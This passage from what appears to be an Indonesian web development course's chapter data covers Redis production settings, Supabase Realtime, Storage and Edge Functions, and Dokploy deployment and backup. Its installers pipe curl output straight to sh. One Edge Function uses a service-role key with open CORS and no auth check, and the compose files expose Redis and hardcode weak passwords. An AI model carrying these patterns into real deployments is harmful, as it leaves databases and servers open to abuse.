    explanation: "Saat menjalankan Redis di production, ada beberapa aspek penting yang harus dikonfigurasi dengan benar.\\n\\n**Persistence**\\nRedis menyimpan data di memory, tapi ada opsi persistensi ke disk:\\n\\n1.\n\n**RDB (Redis Database)**: Snapshot data periodic\\n   - Pros: Compact file, fast restore,\n\nMinimal performance impact\\n   - Cons: Data loss antara snapshots (default: 5 menit)\\n   - Config: save 900 1 (save kalau 1 key berubah dalam 900 detik)\\n\\n2.\n\n**AOF (Append Only File)**: Log setiap write operation\\n   - Pros: Minimal data loss (max 1 detik dengan appendfsync everysec)\\n   - Cons: File lebih besar,\n\nSlower rewrite\\n   - Config: appendonly yes, appendfsync everysec\\n\\n3.\n\n**Both**: RDB + AOF untuk safety maksimal\\n\\n**Memory Management**\\nRedis akan menggunakan semua memory yang tersedia kalau tidak dibatasi.\n\nKonfigurasi penting:\\n\\n```\\nmaxmemory 256mb\\nmaxmemory-policy allkeys-lru\\n```\\n\\nPolicies saat memory penuh:\\n- **noeviction**: Return error untuk write (default,\n\nTidak disarankan)\\n- **allkeys-lru**: Hapus key yang least recently used\\n- **allkeys-lfu**: Hapus key yang least frequently used\\n- **volatile-lru**: Hapus key dengan TTL yang LRU\\n- **volatile-ttl**: Hapus key dengan TTL terpendek\\n\\nUntuk caching, allkeys-lru atau allkeys-lfu paling umum.\\n\\n**Security**\\n1.\n\n**AUTH password**: Require password untuk koneksi\\n   ```\\n   requirepass your-strong-password\\n   ```\\n\\n2.\n\n**ACL (Redis 6+)**: Fine-grained access control\\n   ```\\n   ACL SETUSER app_user on >password ~app:* +@read +@write -@admin\\n   ```\\n\\n3.\n\n**Bind address**: Hanya listen pada interface tertentu\\n   ```\\n   bind 127.0.0.1  # Hanya localhost\\n   ```\\n\\n4.\n\n**Protected mode**: Hanya menerima koneksi dari localhost\\n\\n**Monitoring**\\n- **INFO command**: Statistik Redis (memory, connections, commands)\\n- **SLOWLOG**: Query yang lambat\\n- **MONITOR**: Real-time command monitoring (hati-hati di production!)\\n\\n**Redis Sentinel: High Availability**\\nSentinel menyediakan automatic failover:\\n- Monitor Redis master\\n- Deteksi failure\\n- Promote slave menjadi master otomatis\\n- Update client dengan master baru\\n\\n**Redis Cluster: Horizontal Scaling**\\nCluster memungkinkan Redis di-scale horizontal dengan auto-sharding:\\n- Data di-partisi ke 16384 hash slots\\n- Setiap node punya subset slots\\n- Automatic rebalancing saat node ditambah/dihapus",

    codeExample: { language: "bash", code: "# redis.conf untuk production\n# Persistence\nappendonly yes\nappendfsync everysec\nsave 900 1\nsave 300 10\nsave 60 10000\n\n# Memory\nmaxmemory 256mb\nmaxmemory-policy allkeys-lru\n\n# Security\nbind 127.0.0.1\nrequirepass your-secure-password\nprotected-mode yes\n\n# Logging\nloglevel notice\nlogfile /var/log/redis/redis-server.log\n\n# Slow log (log queries > 10ms)\nslowlog-log-slower-than 10000\nslowlog-max-len 128\n\n# Docker Compose setup\n# docker-compose.yml\nversion: '3'\nservices:\n  redis:\n    image: redis:7-alpine\n    command: redis-server --appendonly yes --maxmemory 256mb --maxmemory-policy allkeys-lru\n    ports:\n      - \"6379:6379\"\n    volumes:\n      - redis-data:/data\n    restart: unless-stopped\n\nvolumes:\n  redis-data:" },

    explainAlong: "appendfsync everysec = keseimbangan antara durability dan performance. allkeys-lru = hapus key yang jarang diakses saat memory penuh.",

    aiPrompt: "Setup Redis dengan Docker Compose. Konfigurasi persistence dan memory limits. Uji dengan load test menggunakan redis-benchmark.",

    reflection: "Redis single-threaded — scaling horizontal dengan Cluster lebih baik daripada vertical scaling untuk write-heavy workloads.",

  },

  {

    id: "17.19",

    moduleId: 17,

    chapterNum: "17.19",

    title: "Supabase: Real-time dan Storage",

    subtitle: "Listen perubahan database real-time dan file storage",

    level: "Menengah",

    objectives: [

      "Bisa menggunakan Supabase Realtime",

      "Mengimplementasikan file storage",

      "Mengerti subscriptions dan presence",

    ],

    analogy: { diagram: "Realtime:\nsupabase.channel('table').on('postgres_changes', callback).subscribe()\n\nStorage:\nsupabase.storage.from('bucket').upload(path, file)\nsupabase.storage.from('bucket').getPublicUrl(path)", caption: "Supabase Realtime mengubah PostgreSQL menjadi database real-time dengan WebSocket subscriptions" },

    explanation: "Dua fitur paling menarik Supabase setelah database dan auth adalah Realtime dan Storage. Keduanya membuka kemungkinan untuk aplikasi interaktif dan user-generated content.\\n\\n**Supabase Realtime**\\nRealtime memungkinkan client mendengarkan perubahan database secara real-time. Cara kerjanya:\\n\\n1. PostgreSQL logical replication mengirim perubahan ke Realtime server\\n2.\n\nRealtime server mengirim ke client via WebSocket\\n3.\n\nClient menerima event dan update UI\\n\\nTanpa perlu polling!\\n\\n```typescript\\n// Subscribe ke INSERT pada tabel 'todos'\\nconst channel = supabase\\n  .channel('todos-channel')\\n  .on('postgres_changes',\\n    { event: 'INSERT', schema: 'public', table: 'todos' },\\n    (payload) => {\\n      console.log('New todo:', payload.new);\\n    }\\n  )\\n  .subscribe();\\n\\nchannel.unsubscribe();\\n```\\n\\nEvent types: INSERT, UPDATE, DELETE, atau * untuk semua.\\n\\n**Supabase Storage**\\nStorage untuk upload dan serve files (gambar, video, dokumen).\\n\\n```typescript\\n// Upload file\\nconst { data, error } = await supabase\\n  .storage.from('avatars')\\n  .upload('user_123.png', file,\n\n{ upsert: true });\\n\\n// Get public URL\\nconst { data } = supabase.storage.from('avatars').getPublicUrl('user_123.png');\\n\\n// Delete file\\nawait supabase.storage.from('avatars').remove(['user_123.png']);\\n```\\n\\n**Presence (Realtime Collaboration)**\\nSupabase Realtime juga support presence — melihat siapa saja yang online:\\n\\n```typescript\\nconst room = supabase.channel('room:1');\\nroom\\n  .on('presence', { event: 'sync' }, () => {\\n    const users = room.presenceState();\\n    console.log('Online:', Object.keys(users).length);\\n  })\\n  .subscribe(async (status) => {\\n    if (status === 'SUBSCRIBED') {\\n      await room.track({ name: 'Budi', online_at: new Date().toISOString() });\\n    }\\n  });\\n```",

    codeExample: { language: "typescript", code: "// Real-time todo list\nimport { useEffect, useState } from 'react';\nimport { supabase } from './supabase';\n\nfunction RealtimeTodoList() {\n  const [todos, setTodos] = useState([]);\n\n  useEffect(() => {\n    supabase.from('todos').select('*').order('created_at', { ascending: false })\n      .then(({ data }) => setTodos(data || []));\n\n    const channel = supabase\n      .channel('todos-realtime')\n      .on('postgres_changes',\n        { event: 'INSERT', schema: 'public', table: 'todos' },\n        (payload) => setTodos(prev => [payload.new, ...prev])\n      )\n      .on('postgres_changes',\n        { event: 'UPDATE', schema: 'public', table: 'todos' },\n        (payload) => setTodos(prev => prev.map(t => t.id === payload.new.id ? payload.new : t))\n      )\n      .on('postgres_changes',\n        { event: 'DELETE', schema: 'public', table: 'todos' },\n        (payload) => setTodos(prev => prev.filter(t => t.id !== payload.old.id))\n      )\n      .subscribe();\n\n    return () => { channel.unsubscribe(); };\n  }, []);\n\n  return <div>{/* render todos */}</div>;\n}\n\n// File upload\nasync function uploadAvatar(userId: string, file: File) {\n  if (!file.type.startsWith('image/')) throw new Error('Must be image');\n  if (file.size > 2 * 1024 * 1024) throw new Error('Max 2MB');\n  const path = `${userId}/avatar.png`;\n  const { error } = await supabase.storage.from('avatars').upload(path, file, { upsert: true });\n  if (error) throw error;\n  const { data } = supabase.storage.from('avatars').getPublicUrl(path);\n  return data.publicUrl;\n}" },

    explainAlong: "Set state langsung dari payload tanpa refetch — UI update instant. Upsert true menimpa file existing.",

    aiPrompt: "Bangun collaborative whiteboard dengan Supabase Realtime. Setiap stroke disimpan dan sync real-time.",

    reflection: "Realtime subscriptions punya limit di free tier. Plan arsitektur-mu dengan mempertimbangkan batasan ini.",

  },

  {

    id: "17.20",

    moduleId: 17,

    chapterNum: "17.20",

    title: "Supabase: Edge Functions dan Production",

    subtitle: "Serverless functions, triggers, dan deployment best practices",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa membuat Edge Functions",

      "Mengerti database triggers",

      "Mengerti production deployment dan security",

    ],

    analogy: { diagram: "Edge Functions:\n├── Deno runtime\n├── TypeScript native\n├── Hono-compatible\n└── Deploy globally\n\nTriggers:\n└── Database webhooks → Edge Function", caption: "Edge Functions memungkinkan logic serverless tanpa manage server" },

    explanation: "Fitur terakhir Supabase yang akan kita pelajari adalah Edge Functions — serverless functions yang berjalan dekat dengan user (edge network). Ini memungkinkan logic backend tanpa manage server sendiri.\\n\\n**Supabase Edge Functions**\\nEdge Functions menggunakan Deno runtime dan berjalan di edge network Supabase. Keunggulannya:\\n\\n1. **Low latency**: Berjalan di edge node terdekat dengan user\\n2.\n\n**TypeScript native**: Deno support TypeScript out-of-the-box\\n3.\n\n**Hono compatible**: Bisa pakai Hono untuk routing\\n4.\n\n**Database access**: Akses Supabase database langsung\\n5.\n\n**Triggers**: Dipanggil oleh database events\\n\\n**Membuat Edge Function**\\n\\n```bash\\n# Create function\\nsupabase functions new hello\\n\\n# Implement (functions/hello/index.ts)\\nimport { serve } from 'https://deno.land/std@0.168.0/http/server.ts';\\n\\nserve(async (req) => {\\n  const { name } = await req.json();\\n  return new Response(JSON.stringify({ message: `Hello ${name}!` }), {\\n    headers: { 'Content-Type': 'application/json' },\\n  });\\n});\\n\\n# Deploy\\nsupabase functions deploy hello\\n```\\n\\n**Edge Function dengan Hono**\\nKarena Edge Functions menggunakan standard fetch API, kamu bisa pakai Hono:\\n\\n```typescript\\nimport { Hono } from 'npm:hono';\\nconst app = new Hono();\\napp.get('/hello',\n\n(c) => c.json({ message: 'Hello from Edge!' }));\\nDeno.serve(app.fetch);\\n```\\n\\n**Database Triggers**\\nTriggers memungkinkan kamu menjalankan code saat event database terjadi:\\n\\n```sql\\nCREATE FUNCTION notify_new_todo() RETURNS TRIGGER AS $$\\nBEGIN\\n  PERFORM net.http_post(\\n    url := 'https://<project>.supabase.co/functions/v1/notify',\\n    body := json_build_object('todo', row_to_json(NEW))\\n  );\\n  RETURN NEW;\\nEND;\\n$$ LANGUAGE plpgsql;\\n\\nCREATE TRIGGER todo_created\\nAFTER INSERT ON todos FOR EACH ROW\\nEXECUTE FUNCTION notify_new_todo();\\n```\\n\\n**Production Checklist**\\n1.\n\n**RLS policies**: Pastikan semua tabel punya RLS\\n2. **API limits**: Monitor usage dan rate limits\\n3. **Backups**: Supabase auto-backup daily (paid tier)\\n4. **Migrations**: Gunakan supabase db push untuk schema changes\\n5.\n\n**Environment**: Gunakan branches untuk staging/production\\n6. **Monitoring**: Dashboard analytics di Supabase console",

    codeExample: { language: "typescript", code: "// Edge Function dengan Hono dan Supabase\n// functions/api/index.ts\nimport { createClient } from 'npm:@supabase/supabase-js@2';\nimport { Hono } from 'npm:hono';\nimport { cors } from 'npm:hono/cors';\n\nconst app = new Hono();\napp.use('*', cors());\n\napp.use('*', async (c, next) => {\n  const supabase = createClient(\n    Deno.env.get('SUPABASE_URL')!,\n    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!,\n  );\n  c.set('supabase', supabase);\n  await next();\n});\n\napp.get('/todos', async (c) => {\n  const supabase = c.get('supabase');\n  const { data, error } = await supabase.from('todos').select('*');\n  if (error) return c.json({ error: error.message }, 500);\n  return c.json(data);\n});\n\napp.post('/todos', async (c) => {\n  const supabase = c.get('supabase');\n  const body = await c.req.json();\n  const { data, error } = await supabase.from('todos').insert(body).select();\n  if (error) return c.json({ error: error.message }, 500);\n  return c.json(data, 201);\n});\n\nDeno.serve(app.fetch);" },

    explainAlong: "Service role key bypass RLS — hanya untuk server-side. npm: specifier untuk npm packages di Deno.",

    aiPrompt: "Buat Edge Function untuk webhook: terima event dari payment gateway, update database berdasarkan payment status.",

    reflection: "Edge Functions punya cold start. Untuk latency critical, pertimbangkan keep-warm strategies.",

  },

  {

    id: "17.21",

    moduleId: 17,

    chapterNum: "17.21",

    title: "Dokploy: Self-Hosted Deployment Platform",

    subtitle: "Deploy aplikasi dengan platform open source alternatif Vercel/Netlify",

    level: "Menengah",

    objectives: [

      "Memahami apa itu Dokploy dan fiturnya",

      "Bisa setup Dokploy di VPS",

      "Mengerti perbedaan Dokploy vs platform managed",

    ],

    analogy: { diagram: "Dokploy Features:\n├── Application deployment (Docker)\n├── Database management\n├── Traefik reverse proxy\n├── Let's Encrypt SSL\n├── Multi-server cluster\n└── Monitoring dashboard", caption: "Dokploy = open source platform deployment self-hosted — alternatif Vercel/Railway/Render" },

    explanation: "Setelah aplikasi selesai dibuat, langkah selanjutnya adalah deployment. Ada banyak pilihan: Vercel, Netlify, Railway, Render — semuanya managed dan berbayar untuk scale. Dokploy adalah alternatif open source yang bisa kamu self-host di VPS sendiri.\\n\\n**Apa Itu Dokploy?**\\nDokploy adalah platform deployment open source yang menyederhanakan proses deploy aplikasi ke VPS. Fitur utamanya:\\n\\n1.\n\n**Docker-based deployment**: Deploy aplikasi sebagai container Docker\\n2. **Database management**: Setup PostgreSQL, MySQL, Redis, MongoDB dengan satu klik\\n3. **Reverse proxy**: Traefik otomatis dengan SSL Let's Encrypt\\n4. **Git integration**: Auto-deploy saat push ke repository\\n5.\n\n**Multi-server**: Manage beberapa server dari satu dashboard\\n6. **Monitoring**: Resource usage, logs, dan metrics\\n\\n**Kenapa Self-Hosted?**\\n1. **Cost**: VPS $5-10/bulan bisa deploy banyak aplikasi\\n2. **Control**: Full control atas server dan konfigurasi\\n3.\n\n**Privacy**: Data tidak tinggal di platform third-party\\n4. **No limits**: Tidak ada batasan bandwith, build time, atau team members\\n5. **Learning**: Memahami infrastruktur deployment\\n\\n**Dokploy vs Vercel/Railway**\\n\\n| Fitur | Dokploy (Self-hosted) | Vercel (Managed) |\\n|-------|----------------------|------------------|\\n| Harga | VPS cost (~$5/bulan) | Free tier limit |\\n| Control | Penuh | Terbatas |\\n| Setup | Butuh VPS + install | Instant |\\n| Scale | Manual/VPS upgrade | Auto |\\n| SSL | Let's Encrypt otomatis | Otomatis |\\n| Databases | Built-in | Terpisah |\\n\\n**Prerequisites**\\n- VPS dengan Docker support (Ubuntu 20.04+, 2GB RAM minimum)\\n- Domain name (opsional tapi direkomendasikan)\\n- SSH access ke VPS",

    codeExample: { language: "bash", code: "# Setup Dokploy di VPS baru (Ubuntu)\n# 1. Update system\nsudo apt update && sudo apt upgrade -y\n\n# 2. Install Docker\ncurl -fsSL https://get.docker.com | sh\nsudo usermod -aG docker $USER\nnewgrp docker\n\n# 3. Install Dokploy\ncurl -sSL https://dokploy.com/install.sh | sh\n\n# 4. Akses dashboard\n# Buka http://your-vps-ip:3000\n# Setup admin account\n\n# 5. (Opsional) Setup domain\n# Di Dokploy dashboard → Settings → Add Domain\n# Point domain A record ke IP VPS\n# Dokploy otomatis setup SSL dengan Let's Encrypt" },

    explainAlong: "Dokploy berjalan sebagai Docker container. Port 3000 untuk dashboard, Traefik handle routing ke aplikasi.",

    aiPrompt: "Siapkan VPS (DigitalOcean, Hetzner, atau AWS). Install Dokploy dan akses dashboard.",

    reflection: "Self-hosted deployment memberimu pengalaman DevOps praktis. Mulai dari VPS kecil dan scale sesuai kebutuhan.",

  },

  {

    id: "17.22",

    moduleId: 17,

    chapterNum: "17.22",

    title: "Dokploy: Deploy Aplikasi dan Database",

    subtitle: "Deploy aplikasi Node.js/Bun dan setup database production",

    level: "Menengah",

    objectives: [

      "Bisa deploy aplikasi dari Git repository",

      "Mengerti environment variables dan secrets",

      "Bisa setup database dengan Dokploy",

    ],

    analogy: { diagram: "Deploy Flow:\nGit Push → Dokploy Pull → Build Docker → Run Container → Traefik Route → SSL", caption: "Dokploy menyederhanakan deployment ke workflow: push code, Dokploy handle sisanya" },

    explanation: "Setelah Dokploy terinstall, saatnya deploy aplikasi pertama. Dokploy support beberapa cara deploy: dari Git repository, Docker image, atau Docker Compose.\\n\\n**Deploy dari Git Repository**\\nIni adalah cara paling umum dan convenient:\\n\\n1. **Create Project** di Dokploy dashboard\\n2. **Add Application** → pilih Git provider (GitHub, GitLab, atau Git URL)\\n3.\n\n**Select repository** dan branch\\n4. **Configure build**: Dokploy auto-detect atau manual\\n5. **Set environment variables**\\n6. **Deploy**\\n\\n**Build Configuration**\\nDokploy bisa auto-detect berdasarkan project files:\\n\\n- **Nixpacks** (default): Auto-detect language dan generate build plan\\n- **Dockerfile**: Gunakan Dockerfile custom\\n- **Docker Compose**: Multi-container deployment\\n\\n**Environment Variables**\\nEnvironment variables di Dokploy di-encrypt dan di-mount ke container:\\n\\n```\\nNODE_ENV=production\\nDATABASE_URL=postgresql://...\\nJWT_SECRET=your-secret\\nREDIS_URL=redis://...\\n```\\n\\n**Database Setup**\\nDokploy punya one-click database templates:\\n\\n1.\n\n**Create Database** di dashboard\\n2. Pilih type: PostgreSQL, MySQL, Redis, MongoDB, MariaDB\\n3. Set resource limits (opsional)\\n4. Database berjalan sebagai Docker container\\n5.\n\nInternal networking: aplikasi bisa connect dengan service name\\n\\nInternal connection string:\\n```\\n# PostgreSQL\\npostgresql://postgres:password@postgres:5432/dbname\\n\\n# Redis\\nredis://redis:6379\\n```\\n\\nNotice: Tidak perlu expose port ke public! Aplikasi dan database berkomunikasi melalui Docker internal network.\\n\\n**Domain dan SSL**\\n1. Tambahkan custom domain di application settings\\n2. Point A record domain ke VPS IP\\n3.\n\nDokploy otomatis generate SSL certificate via Let's Encrypt\\n4. HTTPS siap digunakan!\\n\\n**Auto-Deploy**\\nEnable auto-deploy untuk automatic deployment saat push ke branch:\\n```\\nSettings → Git → Auto Deploy: Enabled\\n```\\n\\nSetiap git push ke branch akan otomatis trigger build dan deploy baru.",

    codeExample: { language: "bash", code: "# Dokploy Dockerfile untuk Bun app\n# Dockerfile\nFROM oven/bun:1 AS base\nWORKDIR /app\n\n# Dependencies\nCOPY package.json bun.lockb ./\nRUN bun install --frozen-lockfile\n\n# Source\nCOPY . .\n\n# Build (kalau perlu)\n# RUN bun run build\n\n# Production\nEXPOSE 3000\nENV NODE_ENV=production\nCMD [\"bun\", \"run\", \"src/index.ts\"]\n\n# docker-compose.yml (untuk multi-service)\nversion: '3.8'\nservices:\n  app:\n    build: .\n    ports:\n      - \"3000:3000\"\n    environment:\n      - DATABASE_URL=postgresql://postgres:pass@db:5432/app\n      - REDIS_URL=redis://redis:6379\n      - NODE_ENV=production\n    depends_on:\n      - db\n      - redis\n\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_DB: app\n      POSTGRES_PASSWORD: pass\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n\n  redis:\n    image: redis:7-alpine\n    volumes:\n      - redisdata:/data\n\nvolumes:\n  pgdata:\n  redisdata:" },

    explainAlong: "--frozen-lockfile memastikan dependency tidak berubah. Multi-service dengan Docker Compose untuk app + database + cache.",

    aiPrompt: "Deploy aplikasi Bun + Hono + Drizzle + Redis ke Dokploy. Gunakan Dokploy managed database.",

    reflection: "Setup CI/CD pipeline: push ke main branch → GitHub Action → Dokploy webhook → auto deploy.",

  },

  {

    id: "17.23",

    moduleId: 17,

    chapterNum: "17.23",

    title: "Dokploy: Monitoring, Backup, dan Best Practices",

    subtitle: "Kelola aplikasi production dengan monitoring dan disaster recovery",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa monitor aplikasi dan resource usage",

      "Mengerti log management",

      "Bisa setup backup dan recovery",

    ],

    analogy: { diagram: "Production Checklist:\n├── Monitoring (CPU, memory, disk)\n├── Log aggregation\n├── Database backups\n├── SSL certificate renewal\n├── Health checks\n└── Multi-server setup", caption: "Production readiness membutuhkan monitoring, logging, dan backup strategy" },

    explanation: "Aplikasi sudah deploy, tapi itu baru setengah perjalanan. Untuk production yang reliable, kamu butuh monitoring, logging, backup, dan disaster recovery plan.\\n\\n**Monitoring di Dokploy**\\nDokploy punya built-in monitoring dashboard:\\n\\n1. **Container Stats**: CPU, memory, network usage per container\\n2. **Server Metrics**: Overall VPS resource usage\\n3.\n\n**Application Logs**: Real-time log streaming\\n4. **Deployment History**: Riwayat deploy dan status\\n\\nAkses monitoring dari dashboard → Application → Monitoring/Logs.\\n\\n**Log Management**\\nLogs penting untuk debugging dan audit:\\n\\n1. **Application Logs**: Stdout/stderr dari container, viewable di dashboard\\n2. **Access Logs**: Traefik access logs untuk HTTP requests\\n3.\n\n**Error Tracking**: Integrasi dengan Sentry atau similar\\n\\nBest practice: Jangan log sensitive data (password, token, PII). Gunakan structured logging (JSON format) untuk easier parsing.\\n\\n**Database Backup**\\nBackup adalah asuransi data. Strategi untuk PostgreSQL:\\n\\n1. **Dokploy automated backups**: Enable di database settings\\n2.\n\n**Manual pg_dump**:\\n   ```bash\\n   docker exec postgres-container pg_dump -U postgres app > backup.sql\\n   ```\\n3.\n\n**Scheduled backups dengan cron**:\\n   ```bash\\n   # Backup harian\\n   0 2 * * * docker exec postgres pg_dump -U postgres app | gzip > /backups/app-$(date +%Y%m%d).sql.gz\\n   ```\\n\\n**SSL Certificate Renewal**\\nLet's Encrypt certificates berlaku 90 hari.\n\nDokploy otomatis renew, tapi periksa status secara berkala:\\n\\n```bash\\n# Cek certificate expiry\\necho | openssl s_client -servername yourdomain.com -connect yourdomain.com:443 2>/dev/null | openssl x509 -noout -dates\\n```\\n\\n**Health Checks**\\nTambahkan health check endpoint di aplikasi:\\n\\n```typescript\\napp.get('/health',\n\n(c) => {\\n  // Cek database connection\\n  // Cek external services\\n  return c.json({ status: 'ok', timestamp: new Date().toISOString() });\\n});\\n```\\n\\nKonfigurasi health check di Dokploy untuk auto-restart kalau aplikasi unhealthy.\\n\\n**Security Best Practices**\\n1.\n\n**Jangan expose database ports**: Gunakan internal Docker network\\n2.\n\n**Gunakan secrets untuk sensitive data**: Jangan hardcode credentials\\n3. **Keep images updated**: Regularly update base images\\n4. **Enable firewall**: UFW atau cloud firewall, hanya buka port yang perlu\\n5. **Regular security updates**: apt update && apt upgrade\\n\\n**Multi-Server (Cluster)**\\nUntuk high availability, Dokploy support multi-server:\\n1.\n\nTambahkan worker nodes di Dokploy settings\\n2. Deploy aplikasi ke multiple servers\\n3. Traefik melakukan load balancing\\n\\n**Disaster Recovery Plan**\\n1. Backup database: daily automated + manual before major changes\\n2.\n\nSource code: Git repository (sudah ada)\\n3. Environment variables: Export dari Dokploy dashboard\\n4. Dokumentasi: Runbook untuk recovery steps",

    codeExample: { language: "bash", code: "# Health check endpoint\n# src/routes/health.ts\nimport { Hono } from 'hono';\nimport { db } from '../db';\nimport { redis } from '../redis';\n\nconst health = new Hono();\n\nhealth.get('/', async (c) => {\n  const checks = {\n    timestamp: new Date().toISOString(),\n    uptime: process.uptime(),\n    checks: {} as Record<string, string>,\n  };\n\n  // Database check\n  try {\n    await db.execute(sql`SELECT 1`);\n    checks.checks.database = 'ok';\n  } catch (err) {\n    checks.checks.database = 'error';\n  }\n\n  // Redis check\n  try {\n    await redis.ping();\n    checks.checks.redis = 'ok';\n  } catch (err) {\n    checks.checks.redis = 'error';\n  }\n\n  const allOk = Object.values(checks.checks).every(v => v === 'ok');\n  return c.json(checks, allOk ? 200 : 503);\n});\n\nexport default health;\n\n# Backup script\n#!/bin/bash\n# backup.sh - Jalankan di server via cron\nBACKUP_DIR=\"/var/backups/app\"\nDATE=$(date +%Y%m%d_%H%M%S)\nmkdir -p $BACKUP_DIR\n\n# Backup PostgreSQL\ndocker exec postgres pg_dump -U postgres app | gzip > $BACKUP_DIR/db_$DATE.sql.gz\n\n# Backup Redis\ndocker exec redis redis-cli BGSAVE\ndocker cp redis:/data/dump.rdb $BACKUP_DIR/redis_$DATE.rdb\n\n# Hapus backup lama (keep 7 days)\nfind $BACKUP_DIR -type f -mtime +7 -delete\n\necho \"Backup completed: $DATE\"" },

    explainAlong: "Health check mengembalikan 503 jika ada service down — Dokploy bisa auto-restart. Cron job untuk backup otomatis harian.",

    aiPrompt: "Setup health check endpoint dan scheduled backup. Configure alerting (email/Slack) untuk notification saat service down.",

    reflection: "Dokumen disaster recovery plan-mu: langkah-langkah restore dari backup, RTO (Recovery Time Objective), dan RPO (Recovery Point Objective).",

  },

  {

    id: "17.24",

    moduleId: 17,

    chapterNum: "17.24",

    title: "Backend Stack: Integrasi Lengkap",

    subtitle: "Satukan Bun + Hono + Drizzle + Redis + Supabase dalam satu proyek",

    level: "Lanjut",

    objectives: [

      "Bisa setup project backend lengkap",

      "Mengerti integrasi antar teknologi",

      "Mampu deploy aplikasi backend production",

    ],

    analogy: { diagram: "Backend Stack:\nBun (runtime) → Hono (framework) → Drizzle ORM (database) → Redis (cache) → Supabase (BaaS opsional)", caption: "Semua teknologi ini saling melengkapi membentuk ekosistem backend modern" },

    explanation: "Kita sudah mempelajari setiap teknologi backend secara individual. Sekarang saatnya menyatukan semuanya dalam satu proyek nyata.\\n\\n**Stack Overview**\\n1. **Bun**: Runtime JavaScript yang cepat dengan built-in tools\\n2. **Hono**: Framework web lightweight untuk routing dan middleware\\n3.\n\n**Drizzle ORM**: Type-safe SQL queries dengan PostgreSQL/SQLite\\n4. **Redis**: Caching, session store, dan real-time features\\n5. **Supabase**: BaaS opsional untuk auth, storage, dan real-time\\n6. **Dokploy**: Self-hosted deployment platform\\n\\n**Setup Project Baru**\\n\\nLangkah 1: Init project\\n```bash\\nmkdir my-backend && cd my-backend\\nbun init -y\\n```\\n\\nLangkah 2: Install dependencies\\n```bash\\nbun add hono drizzle-orm postgres redis\\nbun add -d drizzle-kit @types/bun\\n```\\n\\nLangkah 3: Struktur folder\\n```\\nsrc/\\n├── index.ts          # Entry point\\n├── app.ts            # Hono app setup\\n├── db/\\n│   ├── schema.ts     # Drizzle schema\\n│   └── index.ts      # Database connection\\n├── routes/\\n│   ├── users.ts      # User routes\\n│   └── todos.ts      # Todo routes\\n├── middleware/\\n│   ├── auth.ts       # Auth middleware\\n│   └── cache.ts      # Cache middleware\\n├── services/\\n│   ├── user.service.ts\\n│   └── cache.service.ts\\n└── types.ts          # Shared types\\n```\\n\\n**Workflow Development**\\n1.\n\nDefinisikan schema database\\n2. Generate dan apply migrations\\n3. Buat routes dan handlers\\n4. Tambahkan middleware (auth, cache, logging)\\n5.\n\nTulis tests\\n6. Build dan deploy\\n\\n**Tips Produktivitas**\\n- Gunakan Bun --watch untuk auto-reload saat development\\n- Drizzle Studio untuk explore database\\n- Redis CLI untuk debug cache\\n- Hono logger middleware untuk request logging\\n\\n**Deployment**\\n1. Test locally dengan bun test\\n2. Build Docker image\\n3.\n\nDeploy ke Dokploy/VPS\\n4. Setup monitoring dan alerts\\n5. Configure CI/CD untuk auto-deploy\\n\\nDengan 24 chapter ini (17.1-17.24), kamu sudah menguasai ekosistem backend modern. Selamat!",

    codeExample: { language: "bash", code: "# Complete backend project setup\nmkdir my-backend && cd my-backend\nbun init -y\n\nbun add hono drizzle-orm postgres redis zod\nbun add -d drizzle-kit @types/bun\n\n# drizzle.config.ts\nimport { defineConfig } from 'drizzle-kit';\nexport default defineConfig({\n  schema: './src/db/schema.ts',\n  out: './drizzle',\n  dialect: 'postgresql',\n  dbCredentials: { url: process.env.DATABASE_URL! },\n});\n\n# package.json scripts\n{\n  \"scripts\": {\n    \"dev\": \"bun --watch src/index.ts\",\n    \"build\": \"bun build src/index.ts --outdir ./dist\",\n    \"start\": \"bun dist/index.js\",\n    \"db:generate\": \"drizzle-kit generate\",\n    \"db:migrate\": \"drizzle-kit migrate\",\n    \"db:studio\": \"drizzle-kit studio\",\n    \"test\": \"bun test\",\n    \"lint\": \"bunx eslint src\",\n  }\n}\n\n# Dockerfile\nFROM oven/bun:1\nWORKDIR /app\nCOPY package.json bun.lockb ./\nRUN bun install --frozen-lockfile --production\nCOPY . .\nRUN bun run db:migrate\nEXPOSE 3000\nCMD [\"bun\", \"run\", \"src/index.ts\"]" },

    explainAlong: "--frozen-lockfile untuk production ensures reproducible builds. db:migrate saat build memastikan schema up-to-date.",

    aiPrompt: "Setup project backend lengkap dan deploy ke Dokploy. Buat API documentation dengan Swagger/OpenAPI.",

    reflection: "Kamu sudah menguasai fullstack JavaScript modern. Frontend (React + Vite + Tailwind + shadcn/ui) + Backend (Bun + Hono + Drizzle + Redis) + Deployment (Dokploy).",

  },

  {

    id: "17.25",

    moduleId: 17,

    chapterNum: "17.25",

    title: "Fullstack Project: Dari Nol sampai Production",

    subtitle: "Gabungkan semua teknologi dalam satu proyek fullstack end-to-end",

    level: "Lanjut",

    objectives: [

      "Bisa membuat proyek fullstack lengkap",

      "Mengerti alur kerja fullstack developer",

      "Mampu deploy aplikasi fullstack",

    ],

    analogy: { diagram: "Fullstack Flow:\nFrontend (React+Vite+Tailwind+shadcn) → API (Bun+Hono) → Database (Drizzle+PostgreSQL) → Cache (Redis) → Deploy (Dokploy)", caption: "Semua teknologi yang dipelajari digabungkan dalam satu proyek nyata" },

    explanation: "Ini adalah chapter penutup yang menggabungkan SEMUA teknologi yang sudah kita pelajari. Kita akan membuat aplikasi fullstack sederhana: Task Management App.\\n\\n**Fitur Aplikasi**\\n1. Autentikasi (login/register)\\n2. CRUD tasks\\n3.\n\nReal-time updates\\n4.\n\nFile attachments\\n5.\n\nResponsive UI\\n\\n**Tech Stack**\\n- Frontend: React + Vite + Tailwind CSS + shadcn/ui\\n- Backend: Bun + Hono + Drizzle ORM\\n- Database: PostgreSQL (via Supabase atau self-hosted)\\n- Cache: Redis\\n- Deployment: Dokploy\\n\\n**Arsitektur**\\n```\\n┌─────────────┐      ┌─────────────┐      ┌─────────────┐\\n│   Frontend  │ ──── │    Hono     │ ──── │   Drizzle   │\\n│  (Vercel)   │  API │   (Bun)     │  SQL │  (PostgreSQL)│\\n└─────────────┘      └──────┬──────┘      └─────────────┘\\n                            │\\n                     ┌──────┴──────┐\\n                     │    Redis    │\\n                     │   (Cache)   │\\n                     └─────────────┘\\n```\\n\\n**Langkah Development**\\n\\n1.\n\n**Backend Setup**\\n   - Init Bun project\\n   - 